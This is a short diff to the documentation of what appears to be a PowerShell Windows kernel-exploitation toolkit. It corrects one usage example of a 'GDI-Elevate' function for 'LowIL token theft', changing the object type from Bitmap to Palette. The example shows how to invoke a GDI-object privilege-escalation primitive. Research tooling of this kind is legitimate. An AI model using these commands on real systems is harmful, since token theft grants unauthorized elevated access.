@@ -316,7 +316,7 @@ Note that this function has two methods, if supplied with a pointer to an arbitr
 C:\PS> GDI-Elevate -GDIManager $ManagerBitmap.BitmapHandle -GDIWorker $WorkerBitmap.BitmapHandle -GDIType Bitmap
 
 # LowIL token theft
-C:\PS> GDI-Elevate -GDIManager $ManagerPalette.PaletteHandle -GDIWorker $WorkerPalette.PaletteHandle -GDIType Bitmap -ThreadInfo $ManagerPalette.tagTHREADINFO
+C:\PS> GDI-Elevate -GDIManager $ManagerPalette.PaletteHandle -GDIWorker $WorkerPalette.PaletteHandle -GDIType Palette -ThreadInfo $ManagerPalette.tagTHREADINFO
 
 ```
 
